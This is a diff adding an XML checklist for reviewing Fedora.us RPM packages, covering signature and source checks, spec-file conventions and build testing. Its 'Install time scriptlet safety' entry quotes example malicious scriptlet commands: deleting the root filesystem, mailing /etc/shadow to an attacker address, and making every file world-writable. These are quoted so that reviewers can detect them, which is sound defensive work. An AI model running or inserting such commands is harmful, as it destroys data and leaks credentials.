@@ -1,0 +1,389 @@
+<?xml version='1.0' ?>
+<!DOCTYPE checklist SYSTEM "checklist.dtd">
+<checklist version='0.1' name="fedoraus" revision="0.1">
+  <category name='Security of the build system'>
+    <description>Although many of the checklist items relate to security, the
+      ones listed in this section are important to check before you proceed
+      to the other checklist items.  These checks help to prevent compromise
+      of your system by malicious code in the rpm spec file or the source
+      tarball.  While not an absolute guarantee that there are no trojans
+      waiting for you when you build and run the software, these checks help
+      you verify that the source comes from a genuine project and gives you
+      a clue as to where to start looking if intentional security bugs are
+      found.</description>
+    <entry name="SRPM GPG signed" display="true">
+      <states>
+        <state name="Pass">GPG signature checked and found good</state>
+        <state name="Fail">Missing or Bad GPG Signature</state>
+      </states>
+      <description>The SRPM must be signed by the packager.  This gives you
+        an association to a gpg key which you can then use in tracking down
+        who packaged the code.  It's even better if the gpg key is known to
+        you or to other people you know as that gives you more reference
+        points to a person's real identity.  Over time, as you see more and
+        more packages signed by a person's GPG key, you'll have a history of
+        good or poor packaging habits to think about when reviewing their
+        packages.</description>
+    </entry>
+    <entry name='Canonical Source' display='true'>
+      <states>
+        <state name='Pass'>Source URL is canonical</state>
+        <state name='Fail'>Specified Source URL is not canonical</state>
+      </states>
+      <description>You should check to be sure the Source and URL fields
+        point to canonical sources for the software project.  This helps
+        ensure that the person creating the RPM is not downloading a trojan
+        source tarball from an unknown entity.  Using google to search for
+        canonical home pages is one good way to verify this.</description>
+    </entry>
+    <entry name='MD5Sum verified' display='true'>
+      <states>
+        <state name='Pass'>Upstream MD5Sum verified</state>
+        <state name='Fail'>Upstream MD5Sum does not match!</state>
+      </states>
+      <description>You should always verify that the upstream source matches
+        the source provided in the SRPM.  One technique is to download
+        the pristine source from a known canonical web site and take the MD5
+        hash of it with md5sum.  Comparing this hash to the hash of the
+        source in the SRPM should be identical.  A second method is to
+        download the SRPM for the same package/version from another
+        distribution and compare the MD5 hashes of the Source tarball in
+        that package with the hashes in the package you are reviewing.  This
+        kind of redundant check helps insure that trojaned sources aren't
+        being introduced to the package.</description>
+    </entry>
+    <entry name="Install time scriptlet safety">
+      <states>
+        <state name='Pass'>Install time scriptlets do not have obvious malicious code.</state>
+        <state name='Fail'>Install time scriplet does unsafe things. [REVIEWER please add details]</state>
+        <state name='Not-Applicable'>There are no install time scriptlets</state>
+      </states>
+      <description>The install time scriplets in the %pre, %post, %preun, and
+        %postun are arbitrary shell scripts that are executed when the RPM
+        package is installed or de-installed from the system.  Typically, the
+        root user has to install and deinstall so these scripts execute as
+        root.  It is very important that they are checked for flaws that might
+        make the system more insecure or remove needed files from the
+        filesystem.  Some examples are 'rm -rf /',
+        'mail cracker@domain.com &lt; /etc/shadow', 'chmod -R a+rwX /'
+      </description>
+    </entry>
+    <entry name='Upstream GPG Checked'>
+      <states>
+        <state name='Pass'>Good upstream GPG Signature</state>
+        <state name='Fail'>Upstream GPG Signatures do not match</state>
+        <state name='Not-Applicable'>No upstream GPG Signature</state>
+      </states>
+      <description>Whenever possible, you should check that the upstream tarball is
+        truly from a trusted source.  One method of doing this is to have the
+        upstream developers sign the release tarball with their gpg keys.
+        Another, related method is for the upstream developer gpg sign a
+        file with MD5sums of the source tarballs.  If the upstream developer
+        uses either of these methods, please be sure to verify the source by
+        checking the valdity of the gpg signatures.</description>
+    </entry>
+  </category>
+  <category name="Specfile Scan">
+    <description>You should always look over the spec file before attempting
+      to rebuild a package.  After all, the spec file contains commands that
+      will be executed on your machine with permission to access your files.
+      If you don't check first, there's no telling what programs the package
+      author may be trying to execute.</description>
+    <entry name="Package Naming">
+      <states>
+        <state name='Pass'>Package name conforms to the Fedora Naming Guidelines</state>
+        <state name='Fail'>Package needs to be renamed to meet the Fedora Naming Guidelines</state>
+      </states>
+      <description>The Fedora Package Naming Guidelines specify a way to
+        name packages that is easy to understand, allows smooth upgrading
+        between package releases, and minimizes package conflicts with
+        future Fedora Core distribution upgrades.  Please see:
+        http://videl.ics.hawaii.edu/pipermail/fedora-devel/2003-March/000715.html
+        for the gory details.</description>
+    </entry>
+    <entry name="Install time scriptlet bugs">
+      <states>
+        <state name='Pass'>No bugs found in install time scriptlets</state>
+        <state name='Fail'>Install time scriptlet bug! [REVIEWER: Please add details]</state>
+        <state name='Non-Blocker'>Minor scriptlet bug [REVIEWER: Please add details]</state>
+        <state name='Not-Applicable'>There are no install time scriptlets</state>
+      </states>
+      <description>%pre, %preun, %post, and %postun scripts are necessary to
+        perform necessary prep work on a computer before software is installed
+        on it and to continue setup after the package's files have been
+        unpacked to the filesystem.  Leaving out these automated tasks is a
+        common problem with binary packages.  Examples to watch for: if a
+        package installs libraries (*.so.* files) into %{_libdir}, does the
+        %post and %postun run /sbin/ldconfig?  If the package has *.info
+        files, does %post use install-info to install?  Does %postun use
+        'if [$1 = 0]; then install-info --delete [INFOFILE]; fi' (The 'if'
+        statement makes uninstall only occur on package removal, not upgrade.)
+        Please see the sample spec generated by fedora-newrpmspec for other
+        things to watch out for.
+      </description>
+    </entry>
+    <entry name='Epoch'>
+      <states>
+        <state name="Pass">Versioned dependencies use epoch properly</state>
+        <state name="Fail">Versioned dependency used without proper epoch</state>
+      </states>
+      <description>When you create a package-version dependency in an RPM
+        spec using "Requires:", "BuildRequires", "Provides", "Obsoletes",
+        "Conflicts", or "BuildConflicts" you need to specify the Epoch along
+        with the rest of the version (0 if none are explicitly specified on
+        that package.)  This is because rpm is in the process of
+        transitioning to making Epoch 0 when not specified but hasn't yet
+        applied this completely.  So there are cases where package dependency
+        information is broken without this explicit specification.  Example
+        of a proper dependency with version information:
+        BuildRequires: foobar &gt;= 0:1.0</description>
+    </entry>
+    <entry name="Group Tag">
+      <states>
+        <state name="Pass">Group Tag is from the official list</state>
+        <state name="Fail">Group tag is not from the official list</state>
+        <state name="Non-Blocker">Group tag is not from the official list</state>
+      </states>
+      <description>All RPM spec files contain a group tag that helps to
+        categorize the packaged software.  To be useful this tag must come
+        from the list of valid tags specified in the rpm distribution. Please
+        see /usr/share/doc/rpm-[VERSION]/GROUPS on your computer or
+        http://www.fedora.us/wiki/RPMGroups for the list of valid entries.</description>
+    </entry>
+    <entry name="BuildRoot">
+      <states>
+        <state name='Pass'>Buildroot has all required elements</state>
+        <state name='Fail'>Buildroot lacks certain elements</state>
+      </states>
+      <description>The spec file's BuildRoot: must contain %{_tmppath} in as a prefix
+        so the local user can define where packages are temporarily installed.
+        It should also contain a unique identifier to prevent collisions
+        should multiple users be creating packages.  The Fedora suggested
+        BuildRoot is:
+        %{_tmppath}/%{name}-%{version}-%{release}-root-%(%{__id_u} -n)</description>
+    </entry>
+    <entry name="Paths begin with macros">
+      <states>
+        <state name="Pass">All paths begin with macros</state>
+        <state name="Fail">Some paths lack macros</state>
+        <state name="Non-Blocker">Some paths lack macros</state>
+        <state name="Not-Applicable">No reconfigurable paths</state>
+      </states>
+      <description>Many software packages in the free software world are
+        capable of using compile-time defined directories for their files.
+        This is especially true when working with packages which use a
+        "configure" script to setup the build.  By using macros in place
+        of hard-coding directory paths, the package is prepared for the time
+        when a directory path may change.  A common example is to see the
+        "%configure" macro in the build section of the spec and 
+        "%{_bindir}/foo-program" in the %files section.</description>
+    </entry> 
+    <entry name="Default Passwords">
+      <states>
+        <state name="Pass">Package sets up no default passwords</state>
+        <state name="Fail">Package sets up an account with a default password</state>
+      </states>
+      <description>Any package which needs to have an account created for it
+        should set a non-valid password on the account so no one can login to
+        that account.  The documentation should clearly state that additional
+        setup is needed and list setting a password on the account as one of
+        the steps.  This is a security measure to be sure the default setup is
+        secure from outsiders attempting to access an account on the system
+        and then using local exploits to compromise the system.</description>
+    </entry>
+    <entry name="Desktop Entry/VFolders">
+      <states>
+        <state name="Pass">Desktop entry is fine</state>
+        <state name="Fail">Desktop entry needs work [REVIEWER Please list]</state>
+        <state name="Non-Blocker">Desktop entry needs work [REVIEWER Please list</state>
+        <state name="Not-Applicable">No desktop entry</state>
+      </states>
+      <description>Graphical applications wanting to integrate with the GNOME
+        and KDE menus need to have a .desktop file.  This file should be
+        installed by the spec file using desktop-file-install (from the
+        desktop-file-utils package).  Many times you will find the RPM spec
+        needs to uninstall the .desktop file installed by the software install
+        and reinstall with added options to desktop-file-install
+        Complete instructions are available on:
+        http://www.fedora.us/wiki/FedoraDesktopEntryGuidelines
+      </description>
+    </entry>
+    <entry name="Unowned directories">
+      <states>
+        <state name="Pass">All directories are owned by this or other packages</state>
+        <state name="Fail">Some directories need to be owned by this package</state>
+        <state name="Non-Blocker">Some directories need to be owned by this package</state>
+      </states>
+      <description>All packages install files into directories on the
+        user's filesystem.  Some of these are owned by higher level packages
+        (/etc by filesystem, /usr/lib/python2.3/site-packages/ by python) but
+        others need to be owned by the package that installs them (example:
+        /usr/lib/python2.3/site-packages/gnome-blog).  If these directories do
+        not get owned, then they can not be removed from the system when the
+        package is removed or the system is upgraded.  Own them by listing them
+        in the rpm spec file's %files section.
+      </description>
+    </entry>
+    <entry name="Deprecated Fields">
+      <states>
+        <state name="Pass">No deprecated fields used</state>
+        <state name="Fail">Please fix deprecated fields</state>
+        <state name="Non-Blocker">Please fix deprecated fields</state>
+      </states>
+      <description>There are currently two deprecated fields that should not
+        be used in current spec files.  Copyright and Prereq.  Copyright has
+        been superseded by the License: tag and Prereq by
+        Requires(pre):</description>
+    </entry>
+  </category>
+  <category name="Build and test">
+    <description>After looking over the spec file, you have to attempt to
+      get the package to build, install, and run.</description>
+    <entry name="Mandatory BuildRequires">
+      <states>
+        <state name='Pass'>All necessary BuildRequires listed.</state>
+        <state name='Fail'>Package needs additional BuildRequires: [REVIEWER: Please list]</state>
+      </states>
+      <description>Building a package requires tools (such as a compiler for
+        the programming language) and libraries in order to be created. These
+        required build dependencies must be mentioned in a BuildRequires:
+        field of the rpm spec file so that rpmbuild can assure that they are
+        available to the build system before attempting to build the package.
+        Complicating things, some packages (examples: gcc, glibc) are assumed
+        to be present on any buildsystem and others are pulled in
+        automatically because another BuildRequires needs them (example:
+        if the package requires gtk2-devel and glib2-devel for header files
+        glib2-devel will be automatically pulled in if you list gtk2-devel
+        because gtk2-devel has a dependency on glib2-devel.) Neither of these
+        automatic dependencies should be listed.  (To continue the example,
+        you'd have "BuildRequires: gtk2-devel" in the spec and not mention
+        glib2-devel.)
+        Mach is a tool that can aid in finding required build dependencies.
+        Please see:
+        http://www.fedora.us/wiki/HOWTOFindMissingBuildRequires in the section
+        on using mach for more information about this.</description>
+    </entry>
+    <entry name="Features and BuildRequires">
+      <states>
+        <state name='Pass'>All desired features are enabled</state>
+        <state name='Fail'>Desirable features need extra BuildRequires: [REVIEWER: Please list]</state>
+        <state name='Non-Blocker'>Some minor features were left out of this build: [REVIEWER please list]</state>
+        <state name='Not-Applicable'>No optional features</state>
+      </states>
+      <description>Sometimes a package can have desirable optional
+        features built in but they need to be specifically asked for during
+        the building of the package (usually as switches to configure but
+        occassionally through editing build-time configuration files.)
+        Other times, optional features will be configured by the package's
+        configure script but only if the build system has the libraries
+        needed to make the feature work.  In order to track these down you
+        need to try a variety of method: viewing the output of configure
+        scripts during the build, reading the package's configure.in (or
+        configure.ac), seeing what the package's ./configure --help says,
+        and reading the INSTALL and README documentation in the program's
+        source are some examples.  When you find a feature that just needs
+        enabling, you should point it out to the packager.  When an optional
+        feature needs a specific library in order to compile, you need to
+        list it as a BuildRequires in the spec to be sure the build system
+        will pull it in.</description>
+    </entry>
+    <entry name="Rebuild as non-root">
+      <states>
+        <state name="Pass">Package rebuilds as non-root user</state>
+        <state name="Fail">Package requires the builder to be root</state>
+      </states>
+      <description>All RPMs must be buildable by a non-root user for security.
+        If operations in the package spec or build scripts prevent this, then
+        they must be changed in the spec or patched in the build scripts.
+        One example mistake in a spec file is to use "chown fooUser:root foo"
+        on a file that is supposed to be owned by the fooUser, an operation
+        only allowable by root.  Instead, use "%attr(-, fooUser, root) foo"
+        in the %files section.</description>
+    </entry>
+    <entry name="Parallel makes">
+      <states>
+        <state name="Pass">Make succeeds even when %{_smp_mflags} is defined</state>
+        <state name="Fail">Make does not succeed with %{_smp_mflags}: Remove from spec file</state>
+        <state name="Non-Blocker">Make does not succeed with %{_smp_mflags}: Remove from spec file</state>
+        <state name="Not-Applicable">Does not use make</state>
+      </states>
+      <description>Parallel make using -jN generally speeds up builds.  This is
+        correctly done using "make %{?_smp_mflags} in the specfile.  Some
+        software fails to build with smp_mflags, however.  Simply adding
+        %_smp_mflags -j3 to your ~/.rpmmacros before attempting to rebuild the
+        package will allow you to catch these errors.</description>
+    </entry>
+    <entry name="File Permissions">
+      <states>
+        <state name="Pass">Files have appropriate permissions and owners</state>
+        <state name="Fail">Lax permissions or inappropriate owners</state>
+        <state name="Non-Blocker">Lax permissions or inappropriate owners</state>
+      </states>
+      <description>The binary RPM contains more than files.  It also contains
+        the owners and permissions associated with those files.  Usually, these
+        are set to sane values in the rpm spec file using the %defattr and
+        %attr macros in the %files section (example: %defattr(-, root, root, -),
+        %attr(0644,root,root) %{_sysconfigdir}/file-foo) sometimes these are
+        left out and the packaged files end up being owned by the wrong user.
+        Other times the files are installed with the wrong mode (rwx by any
+        user, for instance, when they should be rwx by root only) which is
+        not always caught by the %defattr macro.
+        Checking for these is very important.  One way of performing the
+        check is to use "rpm -qplv foo-1.0-0.fdr.1.i386.rpm" to list the files
+        with their permissions.  You can then peruse the permissions for
+        anything out of the ordinary.</description>
+    </entry>
+    <entry name="Daemon Ownership">
+      <states>
+        <state name="Pass">Daemon runs as a non-system user or can only run as root</state>
+        <state name="Fail">Daemon uses root or another system account but doesn't have to</state>
+        <state name="Non-Blocker">Daemon uses root or another system account but doesn't have to</state>
+        <state name="Not-Applicable">No daemons in this package</state>
+      </states>
+      <description>Some daemons support running as an unpriviledged user.  When
+        this is the case, the package should create a new, non-system account
+        and configure the program to run as that user.</description>
+    </entry>
+    <entry name="rpmlint">
+      <states>
+        <state name="Pass">Rpmlint does not find problems</state>
+        <state name="Fail">Rpmlint errors: [REVIEWER please list]</state>
+        <state name="Non-Blocker">Rpmlint errors: [REVIEWER please list]</state>
+      </states>
+      <description>After the package is built, you should run rpmlint on the
+        source and binary RPMs.  This will help you find other problems with
+        the RPM that your initial scan of the RPM spec may have missed.  A few
+        items listed by rpmlint do not apply here, but if you don't know what
+        an error means, it's a good idea to post it so the packager and
+        other reviewers can help decide whether it's a blocker or trivial
+        problem.</description>
+    </entry>
+    <entry name="Install and uninstall">
+      <states>
+        <state name="Pass">Package installs and uninstalls cleanly on [REVIEWER, please add Platform Release]</state>
+        <state name="Fail">Package does not install or uninstall cleanly on [REVIEWER, please add Platform Release]</state>
+        <state name="Non-Blocker">Package does not install or uninstall cleanly on [REVIEWER, please add Platform Release]</state>
+      </states>
+      <description>The package should install without problems or error
+        messages onto a system running the base Fedora Core OS and other
+        packages from Fedora Extras/Fedora.us.</description>
+    </entry>
+    <entry name="Runs correctly">
+      <states>
+        <state name="Pass">Software runs fine</state>
+        <state name="Fail">Software fails to run correctly</state>
+        <state name="Non-Blocker">Software does not do everything correctly</state>
+      </states>
+      <description>The packaged software should do something useful when
+        installed.  Sometimes the package appears to do everything correctly.
+        Other times, the package mostly works but sometimes does not.  When
+        this occurs you need to decide whether the software works well enough
+        to go into the "stable" repository anyway, "unstable" repository or
+        needs to have work done to it before it goes in at all.  This is a
+        mater of personal opinion, but some questions to ask are: can the
+        software be used at all?  Is it meant for pre-release testing?  Does
+        it corrupt or lose data?  Can it harm productivity?  Can the problem
+        be worked around?</description>
+    </entry>
+  </category>
+</checklist>
